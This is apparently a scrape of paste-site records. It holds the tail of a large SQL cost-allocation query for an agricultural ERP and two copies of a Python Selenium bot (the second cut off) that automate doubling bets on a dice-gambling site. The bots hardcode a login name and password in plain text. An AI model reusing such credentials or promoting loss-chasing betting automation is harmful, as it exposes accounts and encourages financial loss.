       CAST(""n"".""id"" AS INT4) AS ""destination_unit_load"",
       CAST(""n"".""product"" AS INT4) AS ""destination_product"",
       CAST(""n"".""attribute_category"" AS INT4) AS ""destination_category"",
       CAST(""n"".""attribute_caliber"" AS INT4) AS ""destination_caliber"",
       CAST(""n"".""attribute_confection"" AS INT4) AS ""destination_confection"",
       CAST(""p"".""product"" AS INT4) AS ""destination_base_product"",
       CAST(CASE
                WHEN (""n"".""goods_receipt_line"" IS NOT NULL) THEN %s
                ELSE %s
            END AS VARCHAR) AS ""destination_ul_type"",
       CAST(""r"".""sale_date"" AS DATE) AS ""sale_date"",
       CAST(""k"".""currency"" AS INT4) AS ""currency"",
       CAST(""l"".""digits"" AS INT4) AS ""currency_digits"",
       CAST(""m"".""digits"" AS INT4) AS ""uom_digits"",
       CAST(""s"".""invoice_date_min"" AS DATE) AS ""invoice_date_min"",
       CAST(CASE
                WHEN ((""x"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""x"".""amount"", %s) * (COALESCE(CASE
                                                                                                                     WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                 END, %s) / SUM(CASE
                                                                                                                                    WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_cost_amount"",
       CAST(CASE
                WHEN ((""bd"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""bd"".""amount"", %s) * (COALESCE(CASE
                                                                                                                      WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                  END, %s) / SUM(CASE
                                                                                                                                     WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                 END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_invoice_amount"",
       CAST(""bd"".""invoice_date_min"" AS DATE) AS ""entry_invoice_date_min"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""amount"", %s) * (ROUND(CAST(CASE
                                                                                                                            WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                            ELSE %s
                                                                                                                        END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_amount"",
       CAST((CASE
                 WHEN (COALESCE(""n"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bp"".""processing_cost_amount""), %s) / ""n"".""internal_quantity"") * ROUND(CAST(CASE
                                                                                                                                                                                  WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                                                                  ELSE %s
                                                                                                                                                                              END AS numeric), %s)) AS NUMERIC), ""l"".""digits"")
                 ELSE %s
             END + CASE
                       WHEN (COALESCE(""e"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bn"".""processing_cost_amount""), %s) / ""e"".""internal_quantity"") * CASE
                                                                                                                                                                             WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                                                         END) AS NUMERIC), ""l"".""digits"")
                       ELSE %s
                   END) AS NUMERIC) AS ""processing_cost_amount"",
       CAST((CASE
                 WHEN (COALESCE(""n"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bp"".""processing_fixed_cost_amount""), %s) / ""n"".""internal_quantity"") * ROUND(CAST(CASE
                                                                                                                                                                                        WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                                                                        ELSE %s
                                                                                                                                                                                    END AS numeric), %s)) AS NUMERIC), ""l"".""digits"")
                 ELSE %s
             END + CASE
                       WHEN (COALESCE(""e"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bn"".""processing_fixed_cost_amount""), %s) / ""e"".""internal_quantity"") * CASE
                                                                                                                                                                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                                                               END) AS NUMERIC), ""l"".""digits"")
                       ELSE %s
                   END) AS NUMERIC) AS ""processing_fixed_cost_amount"",
       CAST((CASE
                 WHEN (COALESCE(""n"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bp"".""processing_labor_cost_amount""), %s) / ""n"".""internal_quantity"") * ROUND(CAST(CASE
                                                                                                                                                                                        WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                                                                        ELSE %s
                                                                                                                                                                                    END AS numeric), %s)) AS NUMERIC), ""l"".""digits"")
                 ELSE %s
             END + CASE
                       WHEN (COALESCE(""e"".""internal_quantity"", %s) != %s) THEN ROUND(CAST(((COALESCE((- ""bn"".""processing_labor_cost_amount""), %s) / ""e"".""internal_quantity"") * CASE
                                                                                                                                                                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                                                               END) AS NUMERIC), ""l"".""digits"")
                       ELSE %s
                   END) AS NUMERIC) AS ""processing_labor_cost_amount"",
       CAST(CASE
                WHEN ((""br"".""sale_line"" IS NOT NULL)
                      AND (COALESCE(SUM(""a"".""destination_quantity"") OVER ""bx"", %s) != %s)) THEN ROUND(CAST((COALESCE(""br"".""quantity"", %s) * (COALESCE(""a"".""destination_quantity"", %s) / SUM(""a"".""destination_quantity"") OVER ""bx"")) AS numeric), %s)
            END AS FLOAT8) AS ""sold_account_quantity"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""commission_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                       WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                       ELSE %s
                                                                                                                                   END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_commission_amount"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""carrier_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                    WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                    ELSE %s
                                                                                                                                END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_carrier_amount"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""customs_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                    WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                    ELSE %s
                                                                                                                                END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_customs_amount"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""other_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                  WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                  ELSE %s
                                                                                                                              END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_other_amount"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""credit_note_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                        WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                        ELSE %s
                                                                                                                                    END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_credit_note_amount"",
       CAST(CASE
                WHEN (COALESCE(""q"".""quantity"", %s) != %s) THEN (- ROUND(CAST((COALESCE(""bi"".""reject_amount"", %s) * (ROUND(CAST(CASE
                                                                                                                                   WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                                                   ELSE %s
                                                                                                                               END AS numeric), %s) / ""q"".""quantity"")) AS NUMERIC), ""l"".""digits""))
                ELSE %s
            END AS NUMERIC) AS ""sale_cost_reject_amount"",
       CAST(CASE
                WHEN ((""x"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""x"".""commission_amount"", %s) * (COALESCE(CASE
                                                                                                                                WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                            END, %s) / SUM(CASE
                                                                                                                                               WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                           END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_cost_commission_amount"",
       CAST(CASE
                WHEN ((""x"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""x"".""carrier_amount"", %s) * (COALESCE(CASE
                                                                                                                             WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                         END, %s) / SUM(CASE
                                                                                                                                            WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                        END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_cost_carrier_amount"",
       CAST(CASE
                WHEN ((""x"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""x"".""labor_amount"", %s) * (COALESCE(CASE
                                                                                                                           WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                       END, %s) / SUM(CASE
                                                                                                                                          WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                      END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_cost_labor_amount"",
       CAST(CASE
                WHEN ((""x"".""entry"" IS NOT NULL)
                      AND (SUM(CASE
                                   WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                               END) OVER ""by"" != %s)) THEN (- ROUND(CAST((COALESCE(""x"".""other_amount"", %s) * (COALESCE(CASE
                                                                                                                           WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                       END, %s) / SUM(CASE
                                                                                                                                          WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
                                                                                                                                      END) OVER ""by"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""entry_cost_other_amount"",
       CAST(%s AS VARCHAR) AS ""invoice_numbers"",
       CAST(""bw"".""group"" AS INT4) AS ""destination_confection_group""
FROM
  (SELECT ""b"".""id"" AS ""received_unit_load"",
          ""b"".""internal_quantity"" AS ""received_quantity"",
          ""b"".""id"" AS ""destination_unit_load"",
          ""b"".""internal_quantity"" AS ""destination_quantity""
   FROM ""stock_unit_load"" AS ""b""
   INNER JOIN ""agro_goods_receipt_line"" AS ""c"" ON (""c"".""id"" = ""b"".""goods_receipt_line"")
   INNER JOIN ""agro_goods_receipt"" AS ""d"" ON (""d"".""id"" = ""c"".""receipt"")
   WHERE (((%s
            AND (""d"".""company"" = %s))
           AND (COALESCE(""d"".""effective_date"", %s) > %s))
          AND ((""b"".""sale_line"" IS NOT NULL)
               OR (""b"".""shipment"" LIKE %s ESCAPE %s)))
) AS ""a""
INNER JOIN ""stock_unit_load"" AS ""e"" ON (""a"".""received_unit_load"" = ""e"".""id"")
INNER JOIN ""product_product"" AS ""f"" ON (""f"".""id"" = ""e"".""product"")
INNER JOIN ""product_template"" AS ""g"" ON (""f"".""template"" = ""g"".""id"")
INNER JOIN ""agro_goods_receipt_line"" AS ""h"" ON (""h"".""id"" = ""e"".""goods_receipt_line"")
INNER JOIN ""agro_goods_entry"" AS ""i"" ON (""h"".""entry"" = ""i"".""id"")
INNER JOIN ""agro_goods_receipt"" AS ""j"" ON (""j"".""id"" = ""h"".""receipt"")
INNER JOIN ""company_company"" AS ""k"" ON (""e"".""company"" = ""k"".""id"")
INNER JOIN ""currency_currency"" AS ""l"" ON (""k"".""currency"" = ""l"".""id"")
INNER JOIN ""product_uom"" AS ""m"" ON (""m"".""id"" = ""g"".""default_uom"")
LEFT JOIN ""stock_unit_load"" AS ""n"" ON (""n"".""id"" = ""a"".""destination_unit_load"")
LEFT JOIN ""product_product"" AS ""o"" ON (""n"".""product"" = ""o"".""id"")
LEFT JOIN ""agro_product_attribute_combination"" AS ""p"" ON (""p"".""result_product"" = ""o"".""template"")
LEFT JOIN ""sale_line"" AS ""q"" ON (""q"".""id"" = ""n"".""sale_line"")
LEFT JOIN ""sale_sale"" AS ""r"" ON (""r"".""id"" = ""q"".""sale"")
LEFT JOIN
  (SELECT CAST(SUBSTRING(""t"".""origin""
                         FROM (POSITION(%s IN ""t"".""origin"") + %s)) AS INT4) AS ""sale_line"",
          SUM((""t"".""unit_price"" * ""t"".""quantity"")) AS ""amount"",
          SUM(""t"".""quantity"") AS ""quantity"",
          MIN(""u"".""invoice_date"") AS ""invoice_date_min""
   FROM ""account_invoice_line"" AS ""t""
   LEFT JOIN ""account_invoice"" AS ""u"" ON (""u"".""id"" = ""t"".""invoice"")
   INNER JOIN ""sale_line"" AS ""v"" ON (""v"".""id"" = CAST(SUBSTRING(""t"".""origin""
                                                               FROM (POSITION(%s IN ""t"".""origin"") + %s)) AS INT4))
   INNER JOIN ""sale_sale"" AS ""w"" ON (""w"".""id"" = ""v"".""sale"")
   WHERE ((((COALESCE(""u"".""state"", %s) != %s)
            AND (""t"".""origin"" IS NOT NULL))
           AND (""t"".""origin"" LIKE %s ESCAPE %s))
          AND (%s
               AND (""w"".""company"" = %s))
          AND (COALESCE(""w"".""sale_date"", %s) > %s))
   GROUP BY CAST(SUBSTRING(""t"".""origin""
                           FROM (POSITION(%s IN ""t"".""origin"") + %s)) AS INT4)) AS ""s"" ON (""s"".""sale_line"" = ""q"".""id"")
LEFT JOIN
  (SELECT ""y"".""document_line"" AS ""entry"",
          SUM(""y"".""amount"") AS ""amount"",
          SUM(CASE
                  WHEN (""ba"".""mass_balance_type"" = %s) THEN ""y"".""amount""
                  ELSE %s
              END) AS ""commission_amount"",
          SUM(CASE
                  WHEN (""ba"".""mass_balance_type"" = %s) THEN ""y"".""amount""
                  ELSE %s
              END) AS ""carrier_amount"",
          SUM(CASE
                  WHEN (""ba"".""mass_balance_type"" = %s) THEN ""y"".""amount""
                  ELSE %s
              END) AS ""labor_amount"",
          SUM(CASE
                  WHEN (""ba"".""mass_balance_type"" = %s) THEN ""y"".""amount""
                  ELSE %s
              END) AS ""other_amount""
   FROM ""agro_goods_entry_cost_line"" AS ""y""
   INNER JOIN ""agro_goods_entry_cost"" AS ""z"" ON (""z"".""id"" = ""y"".""cost"")
   INNER JOIN ""agro_goods_entry_cost_type"" AS ""ba"" ON (""ba"".""id"" = ""z"".""type_"")
   INNER JOIN ""agro_goods_entry"" AS ""bb"" ON (""bb"".""id"" = ""y"".""document_line"")
   INNER JOIN ""agro_goods_receipt"" AS ""bc"" ON (((""bc"".""id"" = ""bb"".""receipt"")
                                                AND (""bc"".""company"" = %s))
                                               AND (""bc"".""effective_date"" > %s))
   WHERE ((((%s
             AND (""bc"".""company"" = %s))
            AND (COALESCE(""bc"".""effective_date"", %s) > %s))
           AND (""y"".""amount"" IS NOT NULL))
          AND (""z"".""state"" = %s))
   GROUP BY ""y"".""document_line"") AS ""x"" ON (""x"".""entry"" = ""i"".""id"")
LEFT JOIN
  (SELECT CAST(SUBSTRING(""be"".""origin""
                         FROM (POSITION(%s IN ""be"".""origin"") + %s)) AS INT4) AS ""entry"",
          SUM((""be"".""unit_price"" * ""be"".""quantity"")) AS ""amount"",
          MIN(""bf"".""invoice_date"") AS ""invoice_date_min""
   FROM ""account_invoice_line"" AS ""be""
   LEFT JOIN ""account_invoice"" AS ""bf"" ON (""bf"".""id"" = ""be"".""invoice"")
   INNER JOIN ""agro_goods_entry"" AS ""bg"" ON (""bg"".""id"" = CAST(SUBSTRING(""be"".""origin""
                                                                        FROM (POSITION(%s IN ""be"".""origin"") + %s)) AS INT4))
   INNER JOIN ""agro_goods_receipt"" AS ""bh"" ON (""bh"".""id"" = ""bg"".""receipt"")
   WHERE (((COALESCE(""bf"".""state"", %s) != %s)
           AND (%s
                AND (""bh"".""company"" = %s))
           AND (COALESCE(""bh"".""effective_date"", %s) > %s))
          AND (""be"".""origin"" LIKE %s ESCAPE %s))
   GROUP BY SUBSTRING(""be"".""origin""
                      FROM (POSITION(%s IN ""be"".""origin"") + %s))) AS ""bd"" ON (""bd"".""entry"" = ""i"".""id"")
LEFT JOIN
  (SELECT ""bj"".""document_line"" AS ""sale_line"",
          SUM(""bj"".""amount"") AS ""amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""commission_amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""carrier_amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""customs_amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""other_amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""credit_note_amount"",
          SUM(CASE
                  WHEN (""bl"".""mass_balance_type"" = %s) THEN ""bj"".""amount""
                  ELSE %s
              END) AS ""reject_amount""
   FROM ""sale_cost_line"" AS ""bj""
   INNER JOIN ""sale_cost"" AS ""bk"" ON (""bk"".""id"" = ""bj"".""cost"")
   INNER JOIN ""sale_cost_type"" AS ""bl"" ON (""bl"".""id"" = ""bk"".""type_"")
   INNER JOIN ""sale_sale"" AS ""bm"" ON (""bk"".""document"" = ""bm"".""id"")
   WHERE ((%s
           AND (""bm"".""company"" = %s))
          AND (COALESCE(""bm"".""sale_date"", %s) > %s))
   GROUP BY ""bj"".""document_line"") AS ""bi"" ON (""bi"".""sale_line"" = ""q"".""id"")
LEFT JOIN
  (SELECT ""bo"".""end_"" AS ""unit_load"",
          SUM(""bo"".""amount"") AS ""processing_cost_amount"",
          SUM(CASE
                  WHEN (""bo"".""type_"" = %s) THEN ""bo"".""amount""
                  ELSE %s
              END) AS ""processing_fixed_cost_amount"",
          SUM(CASE
                  WHEN (""bo"".""type_"" = %s) THEN ""bo"".""amount""
                  ELSE %s
              END) AS ""processing_labor_cost_amount""
   FROM ""cm_unit_load_allocation"" AS ""bo""
   WHERE ((%s
           AND (""bo"".""company"" = %s))
          AND (COALESCE(""bo"".""date"", %s) > %s))
   GROUP BY ""bo"".""end_"") AS ""bn"" ON (""bn"".""unit_load"" = ""e"".""id"")
LEFT JOIN
  (SELECT ""bq"".""end_"" AS ""unit_load"",
          SUM(""bq"".""amount"") AS ""processing_cost_amount"",
          SUM(CASE
                  WHEN (""bq"".""type_"" = %s) THEN ""bq"".""amount""
                  ELSE %s
              END) AS ""processing_fixed_cost_amount"",
          SUM(CASE
                  WHEN (""bq"".""type_"" = %s) THEN ""bq"".""amount""
                  ELSE %s
              END) AS ""processing_labor_cost_amount""
   FROM ""cm_unit_load_allocation"" AS ""bq""
   WHERE ((%s
           AND (""bq"".""company"" = %s))
          AND (COALESCE(""bq"".""date"", %s) > %s))
   GROUP BY ""bq"".""end_"") AS ""bp"" ON (((""n"".""id"" IS NOT NULL)
                                      AND (""bp"".""unit_load"" = ""n"".""id""))
                                     AND (""bp"".""unit_load"" != ""e"".""id""))
LEFT JOIN
  (SELECT ""bs"".""sale_line"",
          SUM(""bs"".""quantity"") AS ""quantity""
   FROM ""sale_sale_account_line"" AS ""bs""
   INNER JOIN ""sale_line"" AS ""bt"" ON (""bs"".""sale_line"" = ""bt"".""id"")
   INNER JOIN ""sale_sale"" AS ""bu"" ON (""bu"".""id"" = ""bt"".""sale"")
   WHERE ((%s
           AND (""bu"".""company"" = %s))
          AND (COALESCE(""bu"".""sale_date"", %s) > %s))
   GROUP BY ""bs"".""sale_line"") AS ""br"" ON (""br"".""sale_line"" = ""q"".""id"")
LEFT JOIN ""agro_product_attribute_value"" AS ""bv"" ON (""n"".""attribute_confection"" = ""bv"".""id"")
LEFT JOIN ""agro_product_confection"" AS ""bw"" ON (""bv"".""origin"" = (%s || ""bw"".""id""))
WHERE ((%s
        AND (""j"".""company"" = %s))
       AND (COALESCE(""j"".""effective_date"", %s) > %s)) WINDOW ""bx"" AS (PARTITION BY ""q"".""id""),
                                                             ""by"" AS (PARTITION BY ""h"".""entry"")"
AQispLWV,snowybot python,coinwalk,JavaScript,Tuesday 23rd of April 2024 06:06:34 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""madman"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future2000"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)
print(""logged in"") 
original = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
love = 0.00001
nice = love
tens = (love * 10)
hundreds = (love * 100)
sevens = (love * 6.9)
eights = (love * 7.9)
snowie = 0
funny = False
lamb = 2
silvery = original
awesome = ((math.floor(original / tens)) * tens)
joke = 144000000
goldern = 4
print(""should see bets"")

def go():
    global original
    global love
    global nice
    global tens
    global sevens
    global eights
    global snowie
    global funny
    global lamb
    global awesome
    global joke
    global goldern
    global silvery
    global hundreds
    belance = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
    snow = round(belance-original, 8)
    print(""profit"")
    print(snow)
    if ((belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights)) and (not(belance==snowie))):
        nice = nice*2
        snowie = (belance)
    if ((((love*30)-nice)<=0) and (belance<silvery) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silvery = belance
    if (((belance-(nice*2))<=0) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silvery = belance
        goldern = 2
        funny = True
        joke = ((math.ceil(belance/tens))*tens)
    if ((nice>=(love*goldern)) and (funny==False)):
        joke = ((math.ceil(belance/hundreds))*hundreds)
        funny = True
    if ((nice>=(love*goldern)) and (funny==True) and (belance>=joke) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        goldern = 4
        silvery = belance
        funny = False
        joke = 144000000
    if (belance<silvery):
        silvery = belance
    if (belance >= (original * 144000)):
        print(""winner winner chicken dinner"")
        return
    time.sleep(0.1)
    number = float(nice)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
Q2g5Dg5c,snowybot python,coinwalk,JavaScript,Tuesday 23rd of April 2024 06:00:11 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""madman"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future2000"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)
print(""logged in"") 
original = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
love = 0.00001
nice = love
tens = (love * 10)
sevens = (love * 6.9)
eights = (love * 7.9)
snowie = 0
funny = False
lamb = 2
silvery = original
awesome = ((math.floor(original / tens)) * tens)
joke = 144000000
goldern = 4
print(""should see bets"")

def go():
    global original
    global love
    global nice
    global tens
    global sevens
    global eights
    global snowie
    global funny
    global lamb
    global awesome
    global joke
    global goldern
    global silvery
    belance = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
    snow = round(belance-original, 8)
    print(""profit"")
    print(snow)
    if ((belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights)) and (not(belance==snowie))):
        nice = nice*2
        snowie = (belance)
    if ((((love*30)-nice)<=0) and (belance<silvery) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
